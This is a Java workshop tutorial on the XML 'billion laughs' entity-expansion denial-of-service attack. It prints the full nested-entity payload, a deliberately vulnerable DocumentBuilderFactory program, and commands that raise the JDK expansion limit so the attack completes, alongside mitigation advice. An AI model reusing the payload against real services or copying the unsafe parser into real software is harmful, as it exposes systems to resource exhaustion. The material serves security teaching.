# XML Entity-Expansion Denial of Service

This example demonstrates an XML entity-expansion denial-of-service attack,
often called the “billion laughs” pattern.

The trust boundary is XML supplied to the application. The intentionally
vulnerable program creates a default `DocumentBuilderFactory`, which accepts a
Document Type Definition (DTD) and expands its nested entities. A small
attacker-controlled document can therefore make the parser allocate and process
a much larger DOM. The exercise contrasts that unsafe default with the JDK
entity-expansion guardrail and explains why production parsers should reject
DTDs and external entities when the application does not require them.

## Learning objectives

By the end of this example, attendees can:

- identify the XML input trust boundary and the entity-expansion failure mode;
- trace how nested entities amplify a small document into expensive parser work;
- demonstrate the JDK entity-expansion limit blocking the supplied payload; and
- explain why disabling DTD and entity processing is safer than raising limits
  for untrusted XML.

## Prerequisites

- [Oracle Java 25 or newer](https://www.oracle.com/java/technologies/downloads/#java25)

## The program to inspect

Start with the attacker-controlled payload. Each entity is defined in terms of
the previous entity ten times, so the parser’s work grows multiplicatively
rather than linearly. `lol2.xml`, `lol3.xml`, and `lol4.xml` stop at smaller
expansion levels for the controlled demonstration.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol4;</lolz>

<!-- called the "billion LOLs attack: <lolz>&lol9</lolz> would generate 6 x 10^9, or 1 billion LOLs -->
```

`Main` is the vulnerable baseline. It uses a plain `DocumentBuilderFactory` to
parse `lol.xml` when invoked with the `all` argument, so it accepts the
document’s DTD and allows entity expansion until the runtime guardrail stops it.
With no argument, it parses the three bounded payloads in sequence so that the
expansion growth is visible without starting with the largest provided case.

```java
package demo;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.File;
import java.io.IOException;

public final class Main {

    static void main(final String[] args) throws SAXException, IOException, ParserConfigurationException {
        final DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        final DocumentBuilder db = dbf.newDocumentBuilder();

        if (args.length == 1 && "all".equalsIgnoreCase(args[0])) {
            final Document doc = db.parse(new File("src/main/resources/lol.xml"));
            System.out.println("lol generated " + inventory(doc) + " characters.");
        } else {
            final Document doc2 = db.parse(new File("src/main/resources/lol2.xml"));
            System.out.println("lol_2 generated " + inventory(doc2) + " characters.");

            final Document doc3 = db.parse(new File("src/main/resources/lol3.xml"));
            System.out.println("lol_3 generated " + inventory(doc3) + " characters.");

            final Document doc4 = db.parse(new File("src/main/resources/lol4.xml"));
            System.out.println("lol_4 generated " + inventory(doc4) + " characters.");
        }
    }

    // depth-first traversal of the resulting document tree, using recursion.
    private static int inventory(final Node document) {
        int n = 0;
        for (int i = 0; i < document.getChildNodes().getLength(); ++i) {
            final Node node = document.getChildNodes().item(i);
            if (node.getTextContent() != null) {
                n += node.getTextContent().length();
            }
            n += inventory(node);
        }
        return n;
    }
}
```

`Main` does not explicitly disable DTDs or entities. That omission is
intentional workshop material, not a production parsing pattern.

## Guided walkthrough

Run these commands from this example directory. They create only local Maven
`target/` output and do not modify system configuration.

1. Compile the project. This supplies the classes used for every later command;
   a successful compilation does not make the default parser configuration safe.

   ```shell
   ./mvnw clean package
   ```

   (*Optional*) Verify that the application was created.

   ```shell
   tree --dirsfirst --sort=name -L 1 --prune './target/libs'
   ```

   The application JAR file.

   ```
   ./target/libs
   └── xml-parsing-attack-1.0.0.jar

   1 directory, 1 file
   ```

2. Run the vulnerable baseline with the Java 25 default parser limits.

   ```shell
   java -jar 'target/libs/xml-parsing-attack-1.0.0.jar' all
   ```

   The parser should fail with `JAXP00010001` after 2,500 entity expansions.
   That failure is evidence that the runtime guardrail interrupted this payload;
   it does not show that the application has explicitly configured safe XML
   parsing.

   ```
   [Fatal Error] :1:1: JAXP00010001: The parser has encountered more than "2500" entity expansions in this document; this is the limit imposed by "jdk.xml.entityExpansionLimit".
   Exception in thread "main" org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 1; JAXP00010001: The parser has encountered more than "2500" entity expansions in this document; this is the limit imposed by "jdk.xml.entityExpansionLimit".
       at java.xml/com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:263)
       at java.xml/com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:335)
       at java.xml/javax.xml.parsers.DocumentBuilder.parse(DocumentBuilder.java:206)
       at demo.Main.main(Main.java:20)
   ```

3. Raise the guardrail only to observe amplification in the bounded payloads.

   ```shell
   java \
     -Djdk.xml.entityExpansionLimit=300000 \
     -jar 'target/libs/xml-parsing-attack-1.0.0.jar'
   ```

   The output grows from hundreds to tens of thousands of characters. This is a
   controlled demonstration: raising the limit restores attacker-controlled
   parser work and is not a production mitigation.

   ```
   lol_2 generated 600 characters.
   lol_3 generated 6000 characters.
   lol_4 generated 60000 characters.
   ```

4. Override the same limit for the vulnerable baseline.

   ```shell
   java \
     -Djdk.xml.entityExpansionLimit=300000 \
     -jar 'target/libs/xml-parsing-attack-1.0.0.jar' all
   ```

   `Main all` now accepts `lol.xml` and reports roughly 60,096 characters.
   This proves that changing the limit re-enables the denial-of-service path;
   it is not proof that a higher limit is a safe operational setting.

   ```
   lol generated 60096 characters.
   ```

The safer production alternative is to configure the parser to reject DTDs and
disable both external general and parameter entities when the application does
not need them. When DTD support is a real business requirement, set explicit
resource limits, restrict resolvers and network access, and make a documented
decision about the remaining denial-of-service risk. A successful run or a
parser limit alone is evidence to evaluate, not approval to deploy the example.

## Key takeaways and residual risk

- The vulnerable baseline lets a small untrusted XML document request expensive
  entity expansion from the parser.
- Java 25 stopped the supplied payload at its default entity-expansion limit;
  overriding that limit allowed the payload to complete.
- The preferred mitigation is to reject DTDs and disable entity processing when
  they are unnecessary, rather than increasing limits for untrusted XML.
- If the application must support DTDs, an owner must define bounded resource
  limits and resolver/network policy, then accept and monitor the residual risk.
